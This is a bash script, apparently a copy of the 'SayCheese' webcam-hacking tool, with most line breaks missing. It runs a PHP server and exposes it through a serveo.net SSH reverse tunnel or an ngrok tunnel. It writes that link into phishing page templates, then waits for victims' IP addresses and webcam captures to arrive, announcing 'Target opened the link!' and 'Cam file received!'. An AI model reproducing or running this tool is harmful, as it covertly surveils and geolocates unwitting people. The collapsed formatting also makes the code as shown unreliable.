#!/bin/bash# SayCheese v1.0# coded by: github.com/HACKGM/hackwebcam# If you use any part from this code, giving me the credits. Read the Lincense! trap 'printf "\n";stop' 2 banner() { printf "\e[1;92m ⁪⁬⁮⁮⁮⁮ ⁪⁬⁮⁮⁮⁮ \e[0m\e" printf "\e[1;92m ⁪⁬⁮⁮⁮⁮ ⁪⁬⁮⁮⁮⁮ \e[0m\e" printf "\e[1;92m HACKDORBIN CLAY 📸\e[0m\e \e[0m\n"printf "\e[1;92m Canal telegram: T.me/PlusClay\e[0m \n" printf " \e[1;77m v1.0 coded by https://github.com/PlusClay/cam\e[0m \n" printf "\n" } stop() { checkngrok=$(ps aux | grep -o "ngrok" | head -n1)checkphp=$(ps aux | grep -o "php" | head -n1)checkssh=$(ps aux | grep -o "ssh" | head -n1)if [[ $checkngrok == *'ngrok'* ]]; thenpkill -f -2 ngrok > /dev/null 2>&1killall -2 ngrok > /dev/null 2>&1fi if [[ $checkphp == *'php'* ]]; thenkillall -2 php > /dev/null 2>&1fiif [[ $checkssh == *'ssh'* ]]; thenkillall -2 ssh > /dev/null 2>&1fiexit 1 } dependencies() { command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; } } catch_ip() { ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')IFS=$'\n'printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip cat ip.txt >> saved.ip.txt } checkfound() { printf "\n"printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"while [ true ]; do if [[ -e "ip.txt" ]]; thenprintf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"catch_iprm -rf ip.txt fi sleep 0.5 if [[ -e "Log.log" ]]; thenprintf "\n\e[1;92m[\e[0m+\e[1;92m] 📥Cam file received!\e[0m\n"rm -rf Log.logfisleep 0.5 done } server() { command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; } printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n" if [[ $checkphp == *'php'* ]]; thenkillall -2 php > /dev/null 2>&1fi if [[ $subdomain_resp == true ]]; then $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net 2> /dev/null > sendlink ' & sleep 8else$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' & sleep 8fiprintf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"fuser -k 3333/tcp > /dev/null 2>&1php -S localhost:3333 > /dev/null 2>&1 &sleep 3send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link } payload_ngrok() { link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")sed 's+forwarding_link+'$link'+g' saycheese.html > index2.htmlsed 's+forwarding_link+'$link'+g' template.php > index.php } ngrok_server() { if [[ -e ngrok ]]; thenecho ""elsecommand -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"arch=$(uname -a | grep -o 'arm' | head -n1)arch2=$(uname -a | grep -o 'Android' | head -n1)if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; thenwget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1 if [[ -e ngrok-stable-linux-arm.zip ]]; thenunzip ngrok-stable-linux-arm.zip > /dev/null 2>&1chmod +x ngrokrm -rf ngrok-stable-linux-arm.zipelseprintf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"exit 1fi elsewget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 if [[ -e ngrok-stable-linux-386.zip ]]; thenunzip ngrok-stable-linux-386.zip > /dev/null 2>&1chmod +x ngrokrm -rf ngrok-stable-linux-386.zipelseprintf "\e[1;93m[!] Download error... \e[0m\n"exit 1fififi printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"php -S 127.0.0.1:3333 > /dev/null 2>&1

& sleep 2printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"./ngrok http 3333 > /dev/null 2>&1 &sleep 10 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link payload_ngrokcheckfound} start1() {if [[ -e sendlink ]]; thenrm -rf sendlinkfi printf "\n"printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"default_option_server="1"read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_serveroption_server="${option_server:-${default_option_server}}"if [[ $option_server -eq 1 ]]; then command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }start elif [[ $option_server -eq 2 ]]; thenngrok_serverelseprintf "\e[1;93m [!] Invalid option!\e[0m\n"sleep 1clearstart1fi } payload() { send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink) sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.htmlsed 's+forwarding_link+'$send_link'+g' template.php > index.php } start() { default_choose_sub="Y"default_subdomain="saycheese$RANDOM" printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'read choose_subchoose_sub="${choose_sub:-${default_choose_sub}}"if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; thensubdomain_resp=trueprintf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomainread subdomainsubdomain="${subdomain:-${default_subdomain}}"fi serverpayloadcheckfound } bannerdependenciesstart1
